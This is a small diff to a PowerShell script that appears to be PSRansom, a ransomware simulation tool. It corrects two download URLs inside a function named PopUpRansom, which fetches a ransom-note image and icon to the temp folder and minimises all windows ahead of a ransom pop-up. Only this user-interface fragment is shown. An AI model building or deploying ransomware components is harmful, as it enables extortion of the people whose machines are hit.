@@ -174,8 +174,8 @@ function PopUpRansom {
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
 
-Invoke-WebRequest -useb https://github.com/JoelGMSec/PyShell/tree/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
-Invoke-WebRequest -useb https://github.com/JoelGMSec/PyShell/tree/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
+Invoke-WebRequest -useb https://github.com/JoelGMSec/PSRansom/tree/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
+Invoke-WebRequest -useb https://github.com/JoelGMSec/PSRansom/tree/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
